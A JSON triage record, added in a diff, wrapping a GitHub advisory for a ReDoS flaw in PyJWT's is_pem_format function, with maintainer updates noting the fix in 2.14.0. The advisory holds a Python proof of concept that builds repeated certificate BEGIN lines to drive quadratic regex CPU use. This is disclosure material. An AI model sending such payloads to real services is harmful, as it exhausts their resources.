@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/99135388?v=4\", \"events_url\": \"https://api.github.com/users/Yanni8/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Yanni8/followers\", \"following_url\": \"https://api.github.com/users/Yanni8/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Yanni8/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Yanni8\", \"id\": 99135388, \"login\": \"Yanni8\", \"node_id\": \"U_kgDOBeivnA\", \"organizations_url\": \"https://api.github.com/users/Yanni8/orgs\", \"received_events_url\": \"https://api.github.com/users/Yanni8/received_events\", \"repos_url\": \"https://api.github.com/users/Yanni8/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Yanni8/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Yanni8/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Yanni8\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-102270\", \"cvss\": {\"score\": 4.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1333\", \"name\": \"Inefficient Regular Expression Complexity\"}], \"description\": \"### Summary\\nThere is a Re-DoS vulnerability in the `is_pem_format` function which results in a intesive CPU usage if an attacker is been able to provide a custom certificate.\\n\\n\\n### Details\\nThe problem is that the lazy quantifier `.+?` will always first try to match as little as possible until it finds a `---- END`. Normally this means the complexity of this should be O(N). However, by providing an input which consists only of `----BEGIN CERTIFICATE-----` lines and no `---- END` line, the regex algorithm will first try to match the first line and then, with the lazy quantifier, all the lines until the end O(N), which then fails since it is unable to find a `---- END` line. It will then jump to the next line, resulting in N re-scans of the whole string, which means the complexity basically results in O(N²). \\n\\n\\n### PoC\\n```python\\nimport time\\nimport re\\n\\n\\nBEGIN_LINE = b\\\"-----BEGIN CERTIFICATE-----\\\\n\\\"\\n\\n_PEMS = {\\n    b\\\"CERTIFICATE\\\",\\n    b\\\"TRUSTED CERTIFICATE\\\",\\n    b\\\"PRIVATE KEY\\\",\\n    b\\\"PUBLIC KEY\\\",\\n    b\\\"ENCRYPTED PRIVATE KEY\\\",\\n    b\\\"OPENSSH PRIVATE KEY\\\",\\n    b\\\"DSA PRIVATE KEY\\\",\\n    b\\\"RSA PRIVATE KEY\\\",\\n    b\\\"RSA PUBLIC KEY\\\",\\n    b\\\"EC PRIVATE KEY\\\",\\n    b\\\"DH PARAMETERS\\\",\\n    b\\\"NEW CERTIFICATE REQUEST\\\",\\n    b\\\"CERTIFICATE REQUEST\\\",\\n    b\\\"SSH2 PUBLIC KEY\\\",\\n    b\\\"SSH2 ENCRYPTED PRIVATE KEY\\\",\\n    b\\\"X509 CRL\\\",\\n}\\n\\n_PEM_RE = re.compile(\\n    b\\\"----[- ]BEGIN (\\\"\\n    + b\\\"|\\\".join(_PEMS)\\n    + b\\\"\\\"\\\")[- ]----\\\\r?\\n.+?\\\\r?\\n----[- ]END \\\\\\\\1[- ]----\\\\r?\\\\n?\\\"\\\"\\\",\\n    re.DOTALL,\\n)\\n\\n\\ndef is_pem_format(key: bytes) -> bool:\\n    return bool(_PEM_RE.search(key))\\n\\n\\ndef make_payload(num_headers: int) -> bytes:\\n    return BEGIN_LINE * num_headers\\n\\n\\ndef measure(num_headers: int) -> float:\\n    payload = make_payload(num_headers)\\n    start = time.perf_counter()\\n    is_pem_format(payload)  # returns False, but burns CPU getting there\\n    elapsed = time.perf_counter() - start\\n    print(\\n        f\\\"  headers={num_headers:>4}  size={len(payload)//1024:>3} KB\\\"\\n        f\\\"   time={elapsed*1000:>7.1f} ms\\\"\\n    )\\n    return elapsed\\n\\n\\nfor n in (1000, 2000, 4000, 8000):\\n    measure(n)\\n```\\n\\n### Impact\\nThe attacker could use extensive resources, which could make the resource (e.g. a web server) unavailable.\\n\\n\\n### Maintainer update (2026-09-10): \\nWe reproduced the reported quadratic regex behavior on malformed PEM-like input: doubling repeated BEGIN lines produced approximately fourfold runtime growth, while equal-sized ordinary input remained negligible. The affected path is reached when an application passes attacker-controlled key or certificate bytes to PyJWT’s key preparation, and the impact is resource exhaustion. The fix is on master in commit 8b4e233a22206b34ec1186e912e75c0b2396ac07; it replaces the backtracking PEM regex with a bounded marker scan. Fresh Astra/max review accepted the fix and confirmed malformed, mixed-label, and valid-input controls. This is a distinct ReDoS finding from the later PEM-recognition report that shares the implementation commit. The fix has not yet shipped in a released PyJWT 2.x version, so this advisory is being moved to draft and remains unpublished pending release.\\n\\n## Maintainer update — 2026-09-11\\n\\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with the release recorded as the patched version.\", \"epss\": {\"percentage\": 0.00192, \"percentile\": 0.07924}, \"ghsa_id\": \"GHSA-jwrc-g2q2-pq5p\", \"github_reviewed_at\": \"2026-09-30T14:40:25Z\", \"html_url\": \"https://github.com/advisories/GHSA-jwrc-g2q2-pq5p\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jwrc-g2q2-pq5p\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-102270\"}], \"nvd_published_at\": \"2026-09-28T21:17:14Z\", \"published_at\": \"2026-09-30T14:40:25Z\", \"references\": [\"https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jwrc-g2q2-pq5p\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-102270\", \"https://github.com/jpadilla/pyjwt/commit/8b4e233a22206b34ec1186e912e75c0b2396ac07\", \"https://github.com/jpadilla/pyjwt/releases/tag/2.14.0\", \"https://github.com/advisories/GHSA-jwrc-g2q2-pq5p\"], \"repository_advisory_url\": \"https://api.github.com/repos/jpadilla/pyjwt/security-advisories/GHSA-jwrc-g2q2-pq5p\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/jpadilla/pyjwt\", \"summary\": \"PyJWT: ReDoS vulnerability when calling the `is_pem_format` function.\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-30T14:40:26Z\", \"url\": \"https://api.github.com/advisories/GHSA-jwrc-g2q2-pq5p\", \"vulnerabilities\": [{\"first_patched_version\": \"2.14.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyjwt\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.13.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jwrc-g2q2-pq5p",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyjwt: <= 2.13.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-102270"
+    ],
+    "cvss_score": 4.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyjwt"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-02T19:14:12.269340Z",
+  "provenance": {
+    "content_sha256": "33c85eee4e211c71c5126ca805d3d4b9d0b846d880a11d13fc598c46aaf404eb",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-30T14:40:25Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jwrc-g2q2-pq5p",
+  "status": "active",
+  "title": "PyJWT: ReDoS vulnerability when calling the `is_pem_format` function.",
+  "updated_at": "2026-09-30T14:40:26Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jwrc-g2q2-pq5p"
+}
